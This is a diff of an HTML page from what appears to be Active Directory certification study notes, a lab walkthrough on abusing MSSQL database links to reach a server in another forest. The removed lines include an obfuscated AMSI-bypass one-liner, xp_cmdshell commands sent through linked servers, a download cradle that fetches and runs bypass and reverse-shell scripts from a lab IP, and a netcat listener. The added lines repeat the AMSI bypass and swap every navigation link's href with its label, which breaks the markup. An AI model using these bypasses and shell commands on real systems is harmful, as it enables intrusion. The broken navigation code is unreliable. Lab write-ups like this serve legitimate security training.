@@ -76,25 +76,25 @@
           <a href="../../" class="home-link">← Home</a>
           <a href="../../certifications/" class="home-link">← Certifications</a>
           <h3>Sections</h3>
-          <a href="enumeration.html" class="">Enumeration</a>
-          <a href="privilege-escalation.html" class="">Privilege Escalation</a>
-          <a href="privilege-escalation-domain-admin.html" class="">Privilege Escalation via Domain Admin</a>
-          <a href="golden-ticket.html" class="">Golden Ticket</a>
-          <a href="silver-ticket.html" class="">Silver Ticket</a>
-          <a href="diamond-ticket.html" class="">Diamond Ticket</a>
-          <a href="abusing-dsrm-credentials.html" class="">Abusing DSRM Credentials</a>
-          <a href="dcsync-attack.html" class="">DCSync Attack</a>
-          <a href="security-descriptor-abuse.html" class="">Security Descriptor Abuse</a>
-          <a href="asrep-roasting.html" class="">AS-REP Roasting</a>
-          <a href="unconstrained-delegation.html" class="">Unconstrained Delegation</a>
-          <a href="constrained-delegation.html" class="">Constrained Delegation</a>
-          <a href="rbcd.html" class="">RBCD</a>
-          <a href="sid-history-trust-ticket.html" class="">SID-History Trust Ticket</a>
-          <a href="sid-history-krbtgt.html" class="">SID-History KRBTGT</a>
-          <a href="cross-forest-trust.html" class="">Cross-Forest Trust</a>
-          <a href="adcs-attacks.html" class="">ADCS Attacks</a>
-          <a href="trust-links-abuse.html" class="active">Trust Links Abuse</a>
-          <a href="mde-mdi-bypass.html" class="">MDE/MDI Bypass</a>
+          <a href="Enumeration" class="">enumeration.html</a>
+          <a href="Privilege Escalation" class="">privilege-escalation.html</a>
+          <a href="Privilege Escalation via Domain Admin session" class="">privilege-escalation-domain-admin.html</a>
+          <a href="Golden Ticket" class="">golden-ticket.html</a>
+          <a href="Silver Ticket" class="">silver-ticket.html</a>
+          <a href="Diamond Ticket" class="">diamond-ticket.html</a>
+          <a href="Abusing DSRM Credentials" class="">abusing-dsrm-credentials.html</a>
+          <a href="DCSync Attack" class="">dcsync-attack.html</a>
+          <a href="Security Descriptor Abuse" class="">security-descriptor-abuse.html</a>
+          <a href="ASREP-Roasting Attack" class="">asrep-roasting.html</a>
+          <a href="Unconstrained Delegation" class="">unconstrained-delegation.html</a>
+          <a href="Constrained Delegation" class="">constrained-delegation.html</a>
+          <a href="Resource-Based Constrained Delegation (RBCD)" class="">rbcd.html</a>
+          <a href="Enterprise Admins Trust - SID-History Abuse with Trust Ticket" class="">sid-history-trust-ticket.html</a>
+          <a href="Enterprise Admin Trust - SID-History Abuse with KRBTGT hash" class="">sid-history-krbtgt.html</a>
+          <a href="CrossForest Trust - Trust Flow" class="">cross-forest-trust.html</a>
+          <a href="ADCS Attacks" class="">adcs-attacks.html</a>
+          <a href="Trust Links Abuse" class="">trust-links-abuse.html</a>
+          <a href="MDE/MDI Bypass" class="">mde-mdi-bypass.html</a>
 
         </div>
         <div class="separator"></div>
@@ -117,167 +117,47 @@
         <header class="h2 article-title">Trust Links Abuse</header>
         <section class="about-text">
           <div class="notion-content">
-<p><strong>What is Trust Links Abuse?</strong></p>
-<p>Trust Links Abuse refers to the exploitation of trust relationships within an organization to gain unauthorized access to sensitive information or systems. 
-This can be achieved by manipulating or compromising the trust relationships between individuals or entities within the organization.</p>
-<p><strong>How does it work?</strong></p>
-<ol>
-<li>
-<p>Identifying Trust Relationships: The attacker identifies trust relationships within the organization, such as relationships between employees, contractors, or partners.</p>
-</li>
-<li>
-<p>Compromising Trust: The attacker compromises the trust relationship by gaining access to sensitive information or systems, or by manipulating the relationship to gain unauthorized access.</p>
-</li>
-<li>
-<p>Exploiting Trust: The attacker exploits the compromised trust relationship to gain access to sensitive information or systems, or to perform unauthorized actions.</p>
-</li>
-</ol>
-<p>For this lab, let’s try to get a reverse shell on a SQL server in EUROCORP forest by abusing database links from DCORP-MSSQL.</p>
-<p>Let’s start with enumerating SQL servers in the domain and if studentx has privileges to connect to any of them. We can use PowerUpSQL module for that.</p>
-<p>Since we will be doing the enumeration via PowerShell, let run InvisiShell first for Script Blocking bypass and also AMSI bypass.</p>
-<p><code>RunWithRegistryNonAdmin.bat</code></p>
-<p>AMSI Bypass</p>
-<div class="highlight"><pre><span></span><code><span class="n">S</span><span class="p">`</span><span class="n">eT-It</span><span class="p">`</span><span class="n">em</span> <span class="p">(</span> <span class="s1">&#39;V&#39;</span><span class="p">+</span><span class="s1">&#39;aR&#39;</span> <span class="p">+</span> <span class="s1">&#39;IA&#39;</span> <span class="p">+</span> <span class="p">(</span><span class="s1">&#39;blE:1&#39;</span><span class="p">+</span><span class="s1">&#39;q2&#39;</span><span class="p">)</span> <span class="p">+</span> <span class="p">(</span><span class="s1">&#39;uZ&#39;</span><span class="p">+</span><span class="s1">&#39;x&#39;</span><span class="p">)</span> <span class="p">)</span> <span class="p">(</span><span class="no">[TYpE]</span><span class="p">(</span> <span class="s2">&quot;{1}{0}&quot;</span><span class="o">-F</span><span class="s1">&#39;F&#39;</span><span class="p">,</span><span class="s1">&#39;rE&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">;</span> <span class="p">(</span> <span class="nb">Get-varI</span><span class="p">`</span><span class="n">A</span><span class="p">`</span><span class="n">BLE</span> <span class="p">((</span><span class="s1">&#39;1Q&#39;</span><span class="p">+</span><span class="s1">&#39;2U&#39;</span><span class="p">)</span> <span class="p">+</span><span class="s1">&#39;zX&#39;</span> <span class="p">)</span> <span class="n">-VaL</span> <span class="p">).</span><span class="s2">&quot;A`ss`Embly&quot;</span><span class="p">.</span><span class="s2">&quot;GET</span><span class="se">`T</span><span class="s2">Y`Pe&quot;</span><span class="p">((</span><span class="s2">&quot;{6}{3}{1}{4}{2}{0}{5}&quot;</span> <span class="o">-f</span><span class="p">(</span><span class="s1">&#39;Uti&#39;</span><span class="p">+</span><span class="s1">&#39;l&#39;</span><span class="p">),</span><span class="s1">&#39;A&#39;</span><span class="p">,(</span><span class="s1">&#39;Am&#39;</span><span class="p">+</span><span class="s1">&#39;si&#39;</span><span class="p">),(</span><span class="s1">&#39;.Man&#39;</span><span class="p">+</span><span class="s1">&#39;age&#39;</span><span class="p">+</span><span class="s1">&#39;men&#39;</span><span class="p">+</span><span class="s1">&#39;t.&#39;</span><span class="p">),(</span><span class="s1">&#39;u&#39;</span><span class="p">+</span><span class="s1">&#39;to&#39;</span><span class="p">+</span><span class="s1">&#39;mation.&#39;</span><span class="p">),</span><span class="s1">&#39;s&#39;</span><span class="p">,(</span><span class="s1">&#39;Syst&#39;</span><span class="p">+</span><span class="s1">&#39;em&#39;</span><span class="p">)</span> <span class="p">)</span> <span class="p">).</span><span class="s2">&quot;g`etf`iElD&quot;</span><span class="p">(</span> <span class="p">(</span> <span class="s2">&quot;{0}{2}{1}&quot;</span> <span class="o">-f</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">+</span><span class="s1">&#39;msi&#39;</span><span class="p">),</span><span class="s1">&#39;d&#39;</span><span class="p">,(</span><span class="s1">&#39;I&#39;</span><span class="p">+</span><span class="s1">&#39;nitF&#39;</span><span class="p">+</span><span class="s1">&#39;aile&#39;</span><span class="p">)</span> <span class="p">),(</span> <span class="s2">&quot;{2}{4}{0}{1}{3}&quot;</span> <span class="o">-f</span><span class="p">(</span><span class="s1">&#39;S&#39;</span><span class="p">+</span><span class="s1">&#39;tat&#39;</span><span class="p">),</span><span class="s1">&#39;i&#39;</span><span class="p">,(</span><span class="s1">&#39;Non&#39;</span><span class="p">+</span><span class="s1">&#39;Publ&#39;</span><span class="p">+</span><span class="s1">&#39;i&#39;</span><span class="p">),</span><span class="s1">&#39;c&#39;</span><span class="p">,</span><span class="s1">&#39;c,&#39;</span> <span class="p">)).</span><span class="s2">&quot;sE</span><span class="se">`T`V</span><span class="s2">aLUE&quot;</span><span class="p">(${</span><span class="n">n</span><span class="p">`</span><span class="n">ULl</span><span class="p">},${</span><span class="n">t</span><span class="p">`</span><span class="n">RuE</span><span class="p">}</span> <span class="p">)</span>
-</code></pre></div>
+<p class="" id="30c79e9a-d7c9-80ad-95ff-e31665f79219"><strong>What is Trust Links Abuse?</strong></p><p class="" id="30c79e9a-d7c9-800b-af62-c12addbae9eb">Trust Links Abuse refers to the exploitation of trust relationships within an organization to gain unauthorized access to sensitive information or systems. <br/>This can be achieved by manipulating or compromising the trust relationships between individuals or entities within the organization.</p><p class="" id="30c79e9a-d7c9-80c9-b729-d94275382559"><strong>How does it work?</strong></p><ol class="numbered-list" id="30c79e9a-d7c9-8000-b394-e4b87afee77d" start="1" type="1"><li><strong>Identifying Trust Relationships</strong>: The attacker identifies trust relationships within the organization, such as relationships between employees, contractors, or partners.</li></ol><ol class="numbered-list" id="30c79e9a-d7c9-809f-b309-c34af6e30d4c" start="2" type="1"><li><strong>Compromising Trust</strong>: The attacker compromises the trust relationship by gaining access to sensitive information or systems, or by manipulating the relationship to gain unauthorized access.</li></ol><ol class="numbered-list" id="30c79e9a-d7c9-80a1-bee8-cae7a846419c" start="3" type="1"><li><strong>Exploiting Trust</strong>: The attacker exploits the compromised trust relationship to gain access to sensitive information or systems, or to perform unauthorized actions.</li></ol><p class="" id="30c79e9a-d7c9-80db-b4e6-e4398c8e6dd2">
+</p><p class="" id="30c79e9a-d7c9-804d-91a4-ed81a8ef8332">For this lab, let’s try to get a reverse shell on a SQL server in EUROCORP forest by abusing database links from DCORP-MSSQL.</p><p class="" id="30c79e9a-d7c9-8090-bec5-dd07be770861">Let’s start with enumerating SQL servers in the domain and if studentx has privileges to connect to any of them. We can use PowerUpSQL module for that. <br/></p><p class="" id="30c79e9a-d7c9-80bc-8f17-cecc62097ebf">Since we will be doing the enumeration via PowerShell, let run InvisiShell first for Script Blocking bypass and also AMSI bypass.</p><p class="" id="30c79e9a-d7c9-8096-9aab-fa637565a9c8"><code>RunWithRegistryNonAdmin.bat</code></p><a href="../../assets/crtp/Untitled 105.png"><img src="../../assets/crtp/Untitled 105.png"/></a><p class="" id="30c79e9a-d7c9-803e-b9ef-fa5a09d58f1e">AMSI Bypass</p><link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" referrerpolicy="no-referrer" rel="stylesheet"/><pre class="code code-wrap" id="30c79e9a-d7c9-809a-9fce-e5a99b5a4164"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )</code></pre><p class="" id="30c79e9a-d7c9-8058-9ab7-d15bd01874e9">
+</p><p class="" id="30c79e9a-d7c9-8073-9985-d25b3b18706f">Let’s start with enumerating SQL servers in the domain and if our current compromised user has privileges to connect to any of them. <br/>We can use PowerUpSQL module for that.</p><p class="" id="30c79e9a-d7c9-80f3-997a-f780305f6053">
+</p><p class="" id="30c79e9a-d7c9-8087-ab03-c8cbb67bcfda"><code>Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose</code></p><link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" referrerpolicy="no-referrer" rel="stylesheet"/><pre class="code code-wrap" id="30c79e9a-d7c9-80ce-92b6-db117fd86627"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">VERBOSE: dcorp-mgmt.dollarcorp.moneycorp.local,1433 : Connection Failed.
+VERBOSE: dcorp-mgmt.dollarcorp.moneycorp.local : Connection Failed.
+VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local,1433 : Connection Success.
+VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
+VERBOSE: dcorp-sql1.dollarcorp.moneycorp.local,1433 : Connection Failed.
+VERBOSE: dcorp-sql1.dollarcorp.moneycorp.local : Connection Failed.
 
-<p>Let’s start with enumerating SQL servers in the domain and if our current compromised user has privileges to connect to any of them. 
-We can use PowerUpSQL module for that.</p>
-<p><code>Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose</code></p>
-<div class="highlight"><pre><span></span><code><span class="n">VERBOSE</span><span class="p">:</span> <span class="n">dcorp-mgmt</span><span class="p">.</span><span class="n">dollarcorp</span><span class="p">.</span><span class="n">moneycorp</span><span class="p">.</span><span class="n">local</span><span class="p">,</span><span class="n">1433</span> <span class="p">:</span> <span class="n">Connection</span> <span class="n">Failed</span><span class="p">.</span>
-<span class="n">VERBOSE</span><span class="p">:</span> <span class="n">dcorp-mgmt</span><span class="p">.</span><span class="n">dollarcorp</span><span class="p">.</span><span class="n">moneycorp</span><span class="p">.</span><span class="n">local</span> <span class="p">:</span> <span class="n">Connection</span> <span class="n">Failed</span><span class="p">.</span>
-<span class="n">VERBOSE</span><span class="p">:</span> <span class="n">dcorp-mssql</span><span class="p">.</span><span class="n">dollarcorp</span><span class="p">.</span><span class="n">moneycorp</span><span class="p">.</span><span class="n">local</span><span class="p">,</span><span class="n">1433</span> <span class="p">:</span> <span class="n">Connection</span> <span class="n">Success</span><span class="p">.</span>
-<span class="n">VERBOSE</span><span class="p">:</span> <span class="n">dcorp-mssql</span><span class="p">.</span><span class="n">dollarcorp</span><span class="p">.</span><span class="n">moneycorp</span><span class="p">.</span><span class="n">local</span> <span class="p">:</span> <span class="n">Connection</span> <span class="n">Success</span><span class="p">.</span>
-<span class="n">VERBOSE</span><span class="p">:</span> <span class="n">dcorp-sql1</span><span class="p">.</span><span class="n">dollarcorp</span><span class="p">.</span><span class="n">moneycorp</span><span class="p">.</span><span class="n">local</span><span class="p">,</span><span class="n">1433</span> <span class="p">:</span> <span class="n">Connection</span> <span class="n">Failed</span><span class="p">.</span>
-<span class="n">VERBOSE</span><span class="p">:</span> <span class="n">dcorp-sql1</span><span class="p">.</span><span class="n">dollarcorp</span><span class="p">.</span><span class="n">moneycorp</span><span class="p">.</span><span class="n">local</span> <span class="p">:</span> <span class="n">Connection</span> <span class="n">Failed</span><span class="p">.</span>
 
-<span class="n">ComputerName</span>           <span class="p">:</span> <span class="n">dcorp-mssql</span><span class="p">.</span><span class="n">dollarcorp</span><span class="p">.</span><span class="n">moneycorp</span><span class="p">.</span><span class="n">local</span>
-<span class="n">Instance</span>               <span class="p">:</span> <span class="n">DCORP-MSSQL</span>
-<span class="n">DomainName</span>             <span class="p">:</span> <span class="n">dcorp</span>
-<span class="n">ServiceProcessID</span>       <span class="p">:</span> <span class="n">2024</span>
-<span class="n">ServiceName</span>            <span class="p">:</span> <span class="n">MSSQLSERVER</span>
-<span class="n">ServiceAccount</span>         <span class="p">:</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">NETWORKSERVICE</span>
-<span class="n">AuthenticationMode</span>     <span class="p">:</span> <span class="n">Windows</span> <span class="n">and</span> <span class="n">SQL</span> <span class="n">Server</span> <span class="n">Authentication</span>
-<span class="n">ForcedEncryption</span>       <span class="p">:</span> <span class="n">0</span>
-<span class="n">Clustered</span>              <span class="p">:</span> <span class="n">No</span>
-<span class="n">SQLServerVersionNumber</span> <span class="p">:</span> <span class="n">15</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2000</span><span class="p">.</span><span class="n">5</span>
-<span class="n">SQLServerMajorVersion</span>  <span class="p">:</span> <span class="n">2019</span>
-<span class="n">SQLServerEdition</span>       <span class="p">:</span> <span class="n">Developer</span> <span class="n">Edition</span> <span class="p">(</span><span class="n">64-bit</span><span class="p">)</span>
-<span class="n">SQLServerServicePack</span>   <span class="p">:</span> <span class="n">RTM</span>
-<span class="n">OSArchitecture</span>         <span class="p">:</span> <span class="n">X64</span>
-<span class="n">OsVersionNumber</span>        <span class="p">:</span> <span class="n">SQL</span>
-<span class="n">Currentlogin</span>           <span class="p">:</span> <span class="n">dcorp</span><span class="p">\</span><span class="n">student451</span>
-<span class="n">IsSysadmin</span>             <span class="p">:</span> <span class="n">No</span>
-<span class="n">ActiveSessions</span>         <span class="p">:</span> <span class="n">1</span>
-</code></pre></div>
-
-<h3>ComputerName and Instance</h3>
-<ul>
-<li>
-<p>ComputerName: The name of the computer where the SQL Server instance is running.</p>
-</li>
-<li>
-<p>Instance: The name of the SQL Server instance.</p>
-</li>
-</ul>
-<h3>DomainName</h3>
-<ul>
-<li>DomainName: The name of the domain where the SQL Server instance is located.</li>
-</ul>
-<h3>ServiceProcessID and ServiceName</h3>
-<ul>
-<li>
-<p>ServiceProcessID: The process ID of the SQL Server service.</p>
-</li>
-<li>
-<p>ServiceName: The name of the SQL Server service.</p>
-</li>
-</ul>
-<h3>ServiceAccount</h3>
-<ul>
-<li>ServiceAccount: The account used by the SQL Server service to run. In this case, it's the NT AUTHORITY\NETWORKSERVICE account.</li>
-</ul>
-<h3>AuthenticationMode</h3>
-<ul>
-<li>AuthenticationMode: The authentication mode used by the SQL Server instance. In this case, it's set to both Windows and SQL Server authentication.</li>
-</ul>
-<h3>ForcedEncryption</h3>
-<ul>
-<li>ForcedEncryption: A flag indicating whether encryption is forced for all connections. In this case, it's set to 0, indicating that encryption is not forced.</li>
-</ul>
-<h3>Clustered</h3>
-<ul>
-<li>Clustered: A flag indicating whether the SQL Server instance is clustered. In this case, it's set to No, indicating that the instance is not clustered.</li>
-</ul>
-<h3>SQLServerVersionNumber, SQLServerMajorVersion, and SQLServerEdition</h3>
-<ul>
-<li>
-<p>SQLServerVersionNumber: The version number of the SQL Server instance.</p>
-</li>
-<li>
-<p>SQLServerMajorVersion: The major version number of the SQL Server instance.</p>
-</li>
-<li>
-<p>SQLServerEdition: The edition of the SQL Server instance. In this case, it's the Developer Edition (64-bit).</p>
-</li>
-</ul>
-<h3>SQLServerServicePack</h3>
-<ul>
-<li>SQLServerServicePack: The service pack number of the SQL Server instance. In this case, it's set to RTM, indicating that it's the initial release.</li>
-</ul>
-<h3>OSArchitecture and OsVersionNumber</h3>
-<ul>
-<li>
-<p>OSArchitecture: The architecture of the operating system running the SQL Server instance. In this case, it's X64.</p>
-</li>
-<li>
-<p>OsVersionNumber: The version number of the operating system running the SQL Server instance. In this case, it's SQL, indicating that it's a SQL Server instance.</p>
-</li>
-</ul>
-<h3>Currentlogin and IsSysadmin</h3>
-<ul>
-<li>
-<p>Currentlogin: The current login user of the SQL Server instance. In this case, it's dcorp\student451.</p>
-</li>
-<li>
-<p>IsSysadmin: A flag indicating whether the current login user is a system administrator. In this case, it's set to No, indicating that the user is not a system administrator.</p>
-</li>
-</ul>
-<h3>ActiveSessions</h3>
-<ul>
-<li>ActiveSessions: The number of active sessions on the SQL Server instance. In this case, it's set to 1, indicating that there is one active session.</li>
-</ul>
-<p>This output provides a comprehensive overview of the SQL Server instance, including its configuration, security settings, and current state.</p>
-<p>The PowerUPSQL enumeration show us that we are able to connect to the MSSQL(DCORP-MSSQL) service running in dollarcorp.moneycorp.local domain.</p>
-<p>By sing HeidiSQL client, we can login to DCORP-MSSQL using windows authentication of our current user..</p>
-<p>Now that we were able to login to DCORP-MSSQL we can start making queries.</p>
-<p>we can start by checking the version running this MSSQL, it’s always good to know what version we are working with.
-<code>Select @@version</code></p>
-<p>The following command will enumerate the linked databases on DCORP-MSSQL.</p>
-<p><code>Select * From master..sysservers;</code></p>
-<p>Above we can see that DCORP-MSSQL database has a link to DCORP-SQL1 as well, let’s now do a further enumeration from DCORP-SQL1.</p>
-<p><code>Select * From openquery("DCORP-SQL1", 'Select * From master..sysservers');</code></p>
-<p>One thing we can do is to nest <code>openquery</code> within another <code>openquery</code> which leads us to <strong>DCORP-MGMT.</strong>So let’s continue…</p>
-<p><code>select * from openquery("DCORP-SQL1",'select * from openquery("DCORP-MGMT",''select * from master..sysservers'')')</code></p>
-<p>Now we can see that  DCORP-MGMT has also a trust link to EU.SQL30, which is another database server on another root forest(eu.eurocorp.local).</p>
-<p>Now that we have see how we can manually enumerate trust inside MSSQL database, let’s see an automated and fast way to enumerate theses trust links.</p>
-<p>We can use PowerUPSQL module again.</p>
-<p><code>Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose</code></p>
-<p>Base on the output above from PowerUPSQL, we can see that we do have sysadmin in EU-SQL30.</p>
-<p>From from here we have 2 ways, we can continue on making queries using the MSSQL client HeidiSQL client, or we can continue using PowerUPSQL modules.</p>
-<p>For now let’s continue using PowerUPSQL module <code>Get-SQLServerLinkCrawl</code>.</p>
-<p>Let’s enumerate and check If <code>xp_cmdshell</code> is enabled.</p>
-<p><code>Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'set username'"</code></p>
-<p>Well the above screenshot shows us some interesting information… The query we did above was to check if it is possible to execute OS commands using linked databases.
-We can see that when we check the  parameters in all Instances, the only one that came up containing some information was the EUSQL30 instance(<code>CustomQuery : {USERNAME=SYSTEM, }</code>), meaning that we can execute OS commands using the trust links between instances.</p>
-<p>We can get a Reverse Shell in this case. to achieve this task we will be using Invoke-PowerShellTcp.ps1 by modifying it and adding the following command on it:
-<code>Power -Reverse -IPAddress &lt;OUR_IP&gt; -Port 443</code></p>
-<p>Open Invoke-PowerShellTcpEx.ps1 in PowerShell ISE (Right click on it and click Edit).</p>
-<p>Let’s try to execute a PowerShell download execute cradle to execute a PowerShell reverse shell on the EU-SQL30 instance. 
-We should not forget to start a listener on our machine.</p>
-<p><code>Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec masterxp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.51/sbloggingbypass.txt); iex (iwr -UseBasicParsing http://172.16.100.51/amsibypass.txt); iex (iwr -UseBasicParsing http://172.16.100.51/Invoke-PowerShellTcpEx.ps1)" '' -QueryTarget EU-SQL30</code></p>
-<p>On our side we can simply start our listener.</p>
-<p><code>C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443</code></p>
-<p>We can see above that we were able to abuse the trust link in <strong>DCORP-MSSQL</strong> all the way to <strong>EU-SQL30</strong>. from a simple Domain user to Enterprise Admin.</p>
+ComputerName           : dcorp-mssql.dollarcorp.moneycorp.local
+Instance               : DCORP-MSSQL
+DomainName             : dcorp
+ServiceProcessID       : 2024
+ServiceName            : MSSQLSERVER
+ServiceAccount         : NT AUTHORITY\NETWORKSERVICE
+AuthenticationMode     : Windows and SQL Server Authentication
+ForcedEncryption       : 0
+Clustered              : No
+SQLServerVersionNumber : 15.0.2000.5
+SQLServerMajorVersion  : 2019
+SQLServerEdition       : Developer Edition (64-bit)
+SQLServerServicePack   : RTM
+OSArchitecture         : X64
+OsVersionNumber        : SQL
+Currentlogin           : dcorp\student451
+IsSysadmin             : No
+ActiveSessions         : 1
+</code></pre><h3 class="" id="30c79e9a-d7c9-8001-95ac-dc4cc101f830">ComputerName and Instance</h3><ul class="bulleted-list" id="30c79e9a-d7c9-8045-a0ba-d467509cc672"><li style="list-style-type:disc"><code>ComputerName</code>: The name of the computer where the SQL Server instance is running.</li></ul><ul class="bulleted-list" id="30c79e9a-d7c9-80f1-b886-d774b30eaba6"><li style="list-style-type:disc"><code>Instance</code>: The name of the SQL Server instance.</li></ul><h3 class="" id="30c79e9a-d7c9-80cd-af0a-c14706a325bd">DomainName</h3><ul class="bulleted-list" id="30c79e9a-d7c9-8066-bf5e-e71e7f0c18be"><li style="list-style-type:disc"><code>DomainName</code>: The name of the domain where the SQL Server instance is located.</li></ul><h3 class="" id="30c79e9a-d7c9-8043-ae13-e5a81d81439c">ServiceProcessID and ServiceName</h3><ul class="bulleted-list" id="30c79e9a-d7c9-80c8-a43b-d40be1621106"><li style="list-style-type:disc"><code>ServiceProcessID</code>: The process ID of the SQL Server service.</li></ul><ul class="bulleted-list" id="30c79e9a-d7c9-80ff-9b67-ea2acc50b1aa"><li style="list-style-type:disc"><code>ServiceName</code>: The name of the SQL Server service.</li></ul><h3 class="" id="30c79e9a-d7c9-8062-bb32-db30e1c72489">ServiceAccount</h3><ul class="bulleted-list" id="30c79e9a-d7c9-80f4-ab42-ffb6fae65a91"><li style="list-style-type:disc"><code>ServiceAccount</code>: The account used by the SQL Server service to run. In this case, it's the <code>NT AUTHORITY\\NETWORKSERVICE</code> account.</li></ul><h3 class="" id="30c79e9a-d7c9-8052-9ba2-e251006d6e31">AuthenticationMode</h3><ul class="bulleted-list" id="30c79e9a-d7c9-8007-be3c-ddb02929985c"><li style="list-style-type:disc"><code>AuthenticationMode</code>: The authentication mode used by the SQL Server instance. In this case, it's set to both Windows and SQL Server authentication.</li></ul><h3 class="" id="30c79e9a-d7c9-80ae-a233-c3a699ab232c">ForcedEncryption</h3><ul class="bulleted-list" id="30c79e9a-d7c9-80e0-bc46-fc4d70ed8206"><li style="list-style-type:disc"><code>ForcedEncryption</code>: A flag indicating whether encryption is forced for all connections. In this case, it's set to 0, indicating that encryption is not forced.</li></ul><h3 class="" id="30c79e9a-d7c9-804e-82a8-c05d16ed571f">Clustered</h3><ul class="bulleted-list" id="30c79e9a-d7c9-8099-be53-fb9315f27e2b"><li style="list-style-type:disc"><code>Clustered</code>: A flag indicating whether the SQL Server instance is clustered. In this case, it's set to No, indicating that the instance is not clustered.</li></ul><h3 class="" id="30c79e9a-d7c9-80a2-ad50-ceee2c42ef7a">SQLServerVersionNumber, SQLServerMajorVersion, and SQLServerEdition</h3><ul class="bulleted-list" id="30c79e9a-d7c9-801e-8484-d7d5607456bf"><li style="list-style-type:disc"><code>SQLServerVersionNumber</code>: The version number of the SQL Server instance.</li></ul><ul class="bulleted-list" id="30c79e9a-d7c9-80d0-bccf-da0aee764e1a"><li style="list-style-type:disc"><code>SQLServerMajorVersion</code>: The major version number of the SQL Server instance.</li></ul><ul class="bulleted-list" id="30c79e9a-d7c9-8020-965a-c174acf56d0f"><li style="list-style-type:disc"><code>SQLServerEdition</code>: The edition of the SQL Server instance. In this case, it's the Developer Edition (64-bit).</li></ul><h3 class="" id="30c79e9a-d7c9-80c0-b4d9-cadd014129db">SQLServerServicePack</h3><ul class="bulleted-list" id="30c79e9a-d7c9-80f6-ba7f-d40b447d6f33"><li style="list-style-type:disc"><code>SQLServerServicePack</code>: The service pack number of the SQL Server instance. In this case, it's set to RTM, indicating that it's the initial release.</li></ul><h3 class="" id="30c79e9a-d7c9-806f-a305-e5fc7a1702d8">OSArchitecture and OsVersionNumber</h3><ul class="bulleted-list" id="30c79e9a-d7c9-8091-bab5-fbcd8254401b"><li style="list-style-type:disc"><code>OSArchitecture</code>: The architecture of the operating system running the SQL Server instance. In this case, it's X64.</li></ul><ul class="bulleted-list" id="30c79e9a-d7c9-802f-b8bd-d6cdd7a85242"><li style="list-style-type:disc"><code>OsVersionNumber</code>: The version number of the operating system running the SQL Server instance. In this case, it's SQL, indicating that it's a SQL Server instance.</li></ul><h3 class="" id="30c79e9a-d7c9-8005-bca5-c8ed7f4aacca">Currentlogin and IsSysadmin</h3><ul class="bulleted-list" id="30c79e9a-d7c9-80b5-bb2b-fe528f0c4c48"><li style="list-style-type:disc"><code>Currentlogin</code>: The current login user of the SQL Server instance. In this case, it's <code>dcorp\\student451</code>.</li></ul><ul class="bulleted-list" id="30c79e9a-d7c9-80a5-ab6f-dfaf748ed87c"><li style="list-style-type:disc"><code>IsSysadmin</code>: A flag indicating whether the current login user is a system administrator. In this case, it's set to No, indicating that the user is not a system administrator.</li></ul><h3 class="" id="30c79e9a-d7c9-8013-ade9-eb4ec969e5e3">ActiveSessions</h3><ul class="bulleted-list" id="30c79e9a-d7c9-8008-b610-faae6a88fe68"><li style="list-style-type:disc"><code>ActiveSessions</code>: The number of active sessions on the SQL Server instance. In this case, it's set to 1, indicating that there is one active session.</li></ul><p class="" id="30c79e9a-d7c9-8094-986a-f872b66bb242">This output provides a comprehensive overview of the SQL Server instance, including its configuration, security settings, and current state.</p><p class="" id="30c79e9a-d7c9-8045-b090-f198d5c756ef">
+</p><p class="" id="30c79e9a-d7c9-80b8-b04b-ca334ffc6a74">The PowerUPSQL enumeration show us that we are able to connect to the MSSQL(DCORP-MSSQL) service running in dollarcorp.moneycorp.local domain.</p><p class="" id="30c79e9a-d7c9-8087-a14d-d54acd423c78">
+</p><p class="" id="30c79e9a-d7c9-809d-8e5d-c07b047d1cca">By sing HeidiSQL client, we can login to DCORP-MSSQL using windows authentication of our current user..</p><a href="../../assets/crtp/Untitled 147.png"><img src="../../assets/crtp/Untitled 147.png"/></a><a href="../../assets/crtp/Untitled 148.png"><img src="../../assets/crtp/Untitled 148.png"/></a><p class="" id="30c79e9a-d7c9-8036-9268-d49e123dd2e9">Now that we were able to login to DCORP-MSSQL we can start making queries.</p><p class="" id="30c79e9a-d7c9-80da-a470-c0fbe737494a">
